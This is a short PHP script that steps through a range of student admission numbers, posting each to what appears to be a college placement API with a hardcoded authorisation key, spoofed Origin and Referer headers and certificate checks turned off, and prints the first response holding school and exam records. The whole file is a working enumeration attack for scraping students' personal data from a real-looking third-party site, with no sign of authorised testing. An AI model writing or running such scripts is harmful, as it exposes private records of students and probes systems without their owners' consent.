<?php

declare(strict_types=1);

$authKey = '17f7e7bf8d3ecf54364107279801e88ee6509a09';

for ($n = 10000; $n <= 20000; $n += 100) {
    $ch = curl_init('https://api.aesajce.in/');
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'method' => 'getStudInfo4Placement',
            'admno' => (string) $n,
            'authkey' => $authKey,
        ]),
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_HTTPHEADER => [
            'Content-Type: application/x-www-form-urlencoded',
            'Origin: https://www.aesajce.in',
            'Referer: https://www.aesajce.in/',
        ],
    ]);
    $raw = (string) curl_exec($ch);
    curl_close($ch);
    $j = json_decode($raw, true);
    $data = is_array($j['data'] ?? null) ? $j['data'] : [];
    if (isset($data['edu']) || isset($data['sslc']) || isset($data['hsc']) || isset($data['marks10th'])) {
        echo "{$n}: " . substr($raw, 0, 600) . "\n";
        break;
    }
}
echo "scan done\n";
